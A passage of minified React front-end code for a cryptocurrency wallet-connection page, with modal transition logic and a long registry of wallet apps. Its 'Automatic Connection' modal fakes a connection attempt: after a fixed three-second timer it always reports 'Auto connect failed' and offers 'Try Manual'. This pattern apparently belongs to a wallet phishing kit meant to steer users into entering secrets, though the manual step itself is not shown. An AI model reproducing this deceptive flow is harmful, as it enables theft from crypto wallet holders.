    var n, r;
    let {
        beforeEnter: l,
        afterEnter: a,
        beforeLeave: o,
        afterLeave: i,
        enter: s,
        enterFrom: u,
        enterTo: d,
        entered: h,
        leave: v,
        leaveFrom: y,
        leaveTo: w,
        ...x
    } = e, S = g.useRef(null), f = ge(S, t), c = (n = x.unmount) == null || n ? $t.Unmount : $t.Hidden, {
        show: m,
        appear: k,
        initial: N
    } = W0(), [C, j] = g.useState(m ? "visible" : "hidden"), E = U0(), {
        register: O,
        unregister: T
    } = E;
    g.useEffect(() => O(S), [O, S]), g.useEffect(() => {
        if (c === $t.Hidden && S.current) {
            if (m && C !== "visible") {
                j("visible");
                return
            }
            return Z(C, {
                hidden: () => T(S),
                visible: () => O(S)
            })
        }
    }, [C, S, O, T, m, c]);
    let I = He({
            base: Et(x.className),
            enter: Et(s),
            enterFrom: Et(u),
            enterTo: Et(d),
            entered: Et(h),
            leave: Et(v),
            leaveFrom: Et(y),
            leaveTo: Et(w)
        }),
        ie = V0({
            beforeEnter: l,
            afterEnter: a,
            beforeLeave: o,
            afterLeave: i
        }),
        je = Yn();
    g.useEffect(() => {
        if (je && C === "visible" && S.current === null) throw new Error("Did you forget to passthrough the `ref` to the actual DOM node?")
    }, [S, C, je]);
    let Qe = N && !k,
        Ke = k && m && N,
        Kt = !je || Qe ? "idle" : m ? "enter" : "leave",
        Ye = c0(0),
        P = z(ne => Z(ne, {
            enter: () => {
                Ye.addFlag(Le.Opening), ie.current.beforeEnter()
            },
            leave: () => {
                Ye.addFlag(Le.Closing), ie.current.beforeLeave()
            },
            idle: () => {}
        })),
        L = z(ne => Z(ne, {
            enter: () => {
                Ye.removeFlag(Le.Opening), ie.current.afterEnter()
            },
            leave: () => {
                Ye.removeFlag(Le.Closing), ie.current.afterLeave()
            },
            idle: () => {}
        })),
        $ = Yd(() => {
            j("hidden"), T(S)
        }, E),
        A = g.useRef(!1);
    I0({
        immediate: Ke,
        container: S,
        classes: I,
        direction: Kt,
        onStart: He(ne => {
            A.current = !0, $.onStart(S, ne, P)
        }),
        onStop: He(ne => {
            A.current = !1, $.onStop(S, ne, L), ne === "leave" && !ya($) && (j("hidden"), T(S))
        })
    });
    let W = x,
        Yt = {
            ref: f
        };
    return Ke ? W = { ...W,
        className: Jl(x.className, ...I.current.enter, ...I.current.enterFrom)
    } : A.current && (W.className = Jl(x.className, (r = S.current) == null ? void 0 : r.className), W.className === "" && delete W.className), F.createElement(ga.Provider, {
        value: $
    }, F.createElement(Gm, {
        value: Z(C, {
            visible: Le.Open,
            hidden: Le.Closed
        }) | Ye.flags
    }, fe({
        ourProps: Yt,
        theirProps: W,
        defaultTag: Q0,
        features: Gd,
        visible: C === "visible",
        name: "Transition.Child"
    })))
}

function Y0(e, t) {
    let {
        show: n,
        appear: r = !1,
        unmount: l = !0,
        ...a
    } = e, o = g.useRef(null), i = ge(o, t);
    Yn();
    let s = Zi();
    if (n === void 0 && s !== null && (n = (s & Le.Open) === Le.Open), ![!0, !1].includes(n)) throw new Error("A <Transition /> is used but it is missing a `show={true | false}` prop.");
    let [u, d] = g.useState(n ? "visible" : "hidden"), h = Yd(() => {
        d("hidden")
    }), [v, y] = g.useState(!0), w = g.useRef([n]);
    ae(() => {
        v !== !1 && w.current[w.current.length - 1] !== n && (w.current.push(n), y(!1))
    }, [w, n]);
    let x = g.useMemo(() => ({
        show: n,
        appear: r,
        initial: v
    }), [n, r, v]);
    g.useEffect(() => {
        if (n) d("visible");
        else if (!ya(h)) d("hidden");
        else {
            let m = o.current;
            if (!m) return;
            let k = m.getBoundingClientRect();
            k.x === 0 && k.y === 0 && k.width === 0 && k.height === 0 && d("hidden")
        }
    }, [n, h]);
    let S = {
            unmount: l
        },
        f = z(() => {
            var m;
            v && y(!1), (m = e.beforeEnter) == null || m.call(e)
        }),
        c = z(() => {
            var m;
            v && y(!1), (m = e.beforeLeave) == null || m.call(e)
        });
    return F.createElement(ga.Provider, {
        value: h
    }, F.createElement(va.Provider, {
        value: x
    }, fe({
        ourProps: { ...S,
            as: g.Fragment,
            children: F.createElement(Xd, {
                ref: i,
                ...S,
                ...a,
                beforeEnter: f,
                beforeLeave: c
            })
        },
        theirProps: {},
        defaultTag: g.Fragment,
        features: Gd,
        visible: u === "visible",
        name: "Transition"
    })))
}

function G0(e, t) {
    let n = g.useContext(va) !== null,
        r = Zi() !== null;
    return F.createElement(F.Fragment, null, !n && r ? F.createElement(Xo, {
        ref: t,
        ...e
    }) : F.createElement(Xd, {
        ref: t,
        ...e
    }))
}
let Xo = oe(Y0),
    Xd = oe(K0),
    X0 = oe(G0),
    xe = Object.assign(Xo, {
        Child: X0,
        Root: Xo
    });

function Z0({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    const r = [{
        title: "MetaMask",
        img: "/mm.png"
    }, {
        title: "WalletConnect",
        img: "/wc.png"
    }, {
        title: "LedgerWallet",
        img: "/lw.webp"
    }];
    return p.jsx(p.Fragment, {
        children: p.jsx(xe, {
            appear: !0,
            show: e,
            as: g.Fragment,
            children: p.jsxs(Pe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [p.jsx(xe.Child, {
                    as: g.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: p.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), p.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: p.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: p.jsx(xe.Child, {
                            as: g.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: p.jsxs(Pe.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [p.jsx(Pe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Connect Wallet"
                                }), p.jsx("div", {
                                    className: "mt-4 flex flex-col gap-4",
                                    children: r.map(l => p.jsxs("div", {
                                        tabIndex: 1,
                                        onClick: () => n(l.title),
                                        className: "flex gap-4 cursor-pointer items-center justify-between border-2 text-gray-900 border-gray-900 transition-all hover:border-primary hover:bg-primary/10 hover:text-primary py-2 pl-6 px-3 rounded-full",
                                        children: [p.jsxs("div", {
                                            children: [p.jsx("h6", {
                                                className: "text-base font-medium",
                                                children: l.title
                                            }), p.jsx("p", {
                                                className: "text-sm",
                                                children: "Connect"
                                            })]
                                        }), p.jsx("img", {
                                            src: l.img,
                                            height: 48,
                                            width: 48,
                                            className: l.title === "LedgerWallet" ? "rounded-none" : "rounded-full"
                                        })]
                                    }, l.title))
                                }), p.jsxs("div", {
                                    className: "mt-4 text-xs text-center",
                                    children: ["By connecting a wallet, you agree to the ", p.jsx("span", {
                                        className: "text-primary",
                                        children: "Terms of Service"
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function J0({
    open: e,
    onClose: t,
    wallet: n,
    handleManual: r
}) {
    const [l, a] = g.useState(!1);
    return g.useEffect(() => {
        e ? setTimeout(() => {
            a(!0)
        }, 3e3) : a(!1)
    }, [e]), p.jsx(p.Fragment, {
        children: p.jsx(xe, {
            appear: !0,
            show: e,
            as: g.Fragment,
            children: p.jsxs(Pe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [p.jsx(xe.Child, {
                    as: g.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: p.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), p.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: p.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: p.jsx(xe.Child, {
                            as: g.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: p.jsxs(Pe.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [p.jsx(Pe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Automatic Connection"
                                }), l ? p.jsxs("div", {
                                    className: "bg-red-500 text-white mt-4 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [p.jsx("p", {
                                        className: "text-sm",
                                        children: "Auto connect failed"
                                    }), p.jsx(qe, {
                                        color: "white",
                                        onClick: r,
                                        dense: !0,
                                        label: "Try Manual"
                                    })]
                                }) : p.jsxs("div", {
                                    className: "bg-primary/20 text-primary font-medium mt-4 py-4 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [p.jsx("p", {
                                        className: "text-sm",
                                        children: "Connecting..."
                                    }), p.jsx("svg", {
                                        width: "24",
                                        height: "24",
                                        viewBox: "0 0 24 24",
                                        className: "animate-spin fill-current",
                                        xmlns: "http://www.w3.org/2000/svg",
                                        children: p.jsx("path", {
                                            d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z"
                                        })
                                    })]
                                }), p.jsxs("div", {
                                    className: "mt-4 bg-primary/10 rounded-lg py-3 px-4",
                                    children: [p.jsx("h6", {
                                        className: "text-base font-medium",
                                        children: n
                                    }), p.jsxs("p", {
                                        className: "text-sm",
                                        children: ["Connect to ", n, " and more"]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}
const Tl = {
    "1ce6dae0fea7114845": {
        id: "1ce6dae0fea7114845",
        name: "Binance Smart Chain",
        homepage: "https://www.binance.org/en/smartChain",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114844": {
        id: "1ce6dae0fea7114844",
        name: "SafePal Wallet",
        homepage: "https://safepal.io/",
        chains: ["eip155:1"]
    },
    bfw192192: {
        id: "bfw192192",
        name: "Bifrost wallet",
        homepage: "https://bifrostwallet.com/",
        chains: ["eip155:1"]
    },
    xumm2e093bf3: {
        id: "xumm2e093bf3",
        name: "XUMM Wallet",
        homepage: "https://xumm.app/",
        chains: ["eip155:1"]
    },
    "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369": {
        id: "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
        name: "Rainbow",
        homepage: "https://rainbow.me/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "rainbow:",
            universal: "https://rnbwapp.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Rainbow",
            colors: {
                primary: "rgb(0, 30, 89)",
                secondary: ""
            }
        }
    },
    "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": {
        id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        name: "Trust Wallet",
        homepage: "https://trustwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1288339409",
            android: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "trust:",
            universal: "https://link.trustwallet.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Trust",
            colors: {
                primary: "rgb(51, 117, 187)",
                secondary: ""
            }
        }
    },
    cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46: {
        id: "cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46",
        name: "Argent",
        homepage: "https://argent.xyz/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/argent/id1358741926",
            android: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "argent://app",
            universal: "https://argent.link/app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Argent",
            colors: {
                primary: "rgb(255, 135, 91)",
                secondary: ""
            }
        }
    },
    a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f: {
        id: "a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f",
        name: "Gnosis Safe Multisig",
        homepage: "https://gnosis-safe.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://gnosis-safe.io/app/",
            ios: "https://apps.apple.com/app/id1515759131",
            android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Gnosis Safe",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "1ce6dae0fea7114841": {
        id: "1ce6dae0fea7114841",
        name: "Equal",
        homepage: "https://equal.tech/",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114842": {
        id: "1ce6dae0fea7114842",
        name: "MEET.ONE",
        homepage: "https://www.meet.one/",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114843": {
        id: "1ce6dae0fea7114843",
        name: "MoriX Wallet",
        homepage: "https://morixjp.com/eng/products/walletcard",
        chains: ["eip155:1"]
    },
    f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d: {
        id: "f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d",
        name: "Crypto.com | DeFi Wallet",
        homepage: "https://crypto.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1262148500",
            android: "https://play.google.com/store/apps/details?id=co.mona.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "cryptowallet:",
            universal: "https://wallet.crypto.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Crypto.com",
            colors: {
                primary: "rgb(17, 153, 250)",
                secondary: ""
            }
        }
    },
    "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c": {
        id: "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c",
        name: "Pillar",
        homepage: "https://pillarproject.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1346582238",
            android: "https://play.google.com/store/apps/details?id=com.pillarproject.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "pillarwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Pillar",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2": {
        id: "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2",
        name: "imToken",
        homepage: "https://token.im/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/imtoken2/id1384798940",
            android: "https://play.google.com/store/apps/details?id=im.token.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "imtokenv2:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "imToken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137: {
        id: "dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137",
        name: "ONTO",
        homepage: "https://onto.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/onto-an-ontology-dapp/id1436009823",
            android: "https://play.google.com/store/apps/details?id=com.github.ontio.onto",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "ontoprovider:",
            universal: "https://onto.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ONTO",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66": {
        id: "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66",
        name: "TokenPocket",
        homepage: "https://tokenpocket.pro/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/tokenpocket-trusted-wallet/id1436028697",
            android: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "tpoutside:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "TokenPocket",
            colors: {
                primary: "rgb(41, 128, 254)",
                secondary: ""
            }
        }
    },
    "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26": {
        id: "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26",
        name: "MathWallet",
        homepage: "https://mathwallet.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331",
            android: "https://play.google.com/store/apps/details?id=com.medishares.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "mathwallet:",
            universal: "https://www.mathwallet.org"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "MathWallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b: {
        id: "ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b",
        name: "BitPay",
        homepage: "https://bitpay.com",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638",
            android: "https://play.google.com/store/apps/details?id=com.bitpay.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "bitpay:",
            universal: "https://bitpay.com/wallet"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "BitPay",
            colors: {
                primary: "rgb(26, 59, 139)",
                secondary: ""
            }
        }
    },
    "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168": {
        id: "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168",
        name: "Walleth",
        homepage: "https://walleth.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=org.walleth",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Walleth",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d": {
        id: "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d",
        name: "Authereum",
        homepage: "https://authereum.org",
        chains: ["eip155:1"],
        app: {
            browser: "https://authereum.com/i/account",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Authereum",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f": {
        id: "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f",
        name: "Dharma",
        homepage: "https://www.dharma.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/dharma-save-send-globally/id1495144415",
            android: "https://play.google.com/store/apps/details?id=io.dharma.Dharma",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "dharma:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Dharma",
            colors: {
                primary: "#0DD675",
                secondary: "#F5F5F5"
            }
        }
    },
    "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890": {
        id: "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890",
        name: "1inch Wallet",
        homepage: "https://1inch.io/wallet/",
        chains: ["eip155:1", "eip155:56"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "1inch:",
            universal: "https://wallet.1inch.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "1inch",
            colors: {
                primary: "rgb(31, 36, 46)",
                secondary: ""
            }
        }
    },
    bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4: {
        id: "bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4",
        name: "Huobi Wallet",
        homepage: "https://huobiwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1433883012",
            android: "https://play.google.com/store/apps/details?id=com.huobionchainwallet.gp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "huobiwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Huobi",
            colors: {
                primary: "rgb(45,101,248)",
                secondary: ""
            }
        }
    },
    efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61: {
        id: "efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61",
        name: "Eidoo",
        homepage: "https://eidoo.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/apple-store/id1279896253",
            android: "https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "eidoo:",
            universal: "https://eidoo.io/crypto-wallet"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Eidoo",
            colors: {
                primary: "rgb(55, 179, 159)",
                secondary: ""
            }
        }
    },
    "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e": {
        id: "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e",
        name: "MYKEY",
        homepage: "https://mykey.org",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/id1458318224",
            android: "https://play.google.com/store/apps/details?id=com.mykey.id",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "mykeywalletconnect:",
            universal: "https://mykey.org"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "MYKEY",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756: {
        id: "dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756",
        name: "Loopring Wallet",
        homepage: "https://loopring.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/loopring-smart-wallet/id1550921126",
            android: "https://play.google.com/store/apps/details?id=loopring.defi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Loopring",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6": {
        id: "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6",
        name: "TrustVault",
        homepage: "https://trustology.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1455959680",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "TrustVault",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a": {
        id: "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a",
        name: "Atomic",
        homepage: "https://atomicwallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/atomic-wallet/id1478257827",
            android: "https://play.google.com/store/apps/details?id=io.atomicwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Atomic",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e: {
        id: "b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e",
        name: "Coin98",
        homepage: "https://coin98.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://ios.coin98.app/",
            android: "https://play.google.com/store/apps/details?id=coin98.crypto.finance.media",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "coin98:",
            universal: "https://coin98.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Coin98",
            colors: {
                primary: "rgb(39,39,39)",
                secondary: ""
            }
        }
    },
    "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d": {
        id: "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d",
        name: "CoolWallet S",
        homepage: "https://coolwallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/coolwallet-s-2018/id1328764142",
            android: "https://play.google.com/store/apps/details?id=com.coolbitx.cwsapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "CoolWallet S",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693: {
        id: "beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693",
        name: "Alice",
        homepage: "https://alicedapp.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/au/app/alice-browser/id1472818028",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Alice",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98": {
        id: "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98",
        name: "AlphaWallet",
        homepage: "https://alphawallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430",
            android: "https://play.google.com/store/apps/details?id=io.stormbird.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: "https://aw.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AlphaWallet",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63": {
        id: "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63",
        name: "D'CENT Wallet",
        homepage: "https://dcentwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/kr/app/dcent-hardware-wallet/id1447206611",
            android: "https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "D'CENT",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09": {
        id: "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09",
        name: "ZelCore",
        homepage: "https://zel.network",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/zelcore/id1436296839",
            android: "https://play.google.com/store/apps/details?id=com.zelcash.zelcore",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "zel:",
            universal: "https://link.zel.network"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ZelCore",
            colors: {
                primary: "rgb(35, 34, 32)",
                secondary: ""
            }
        }
    },
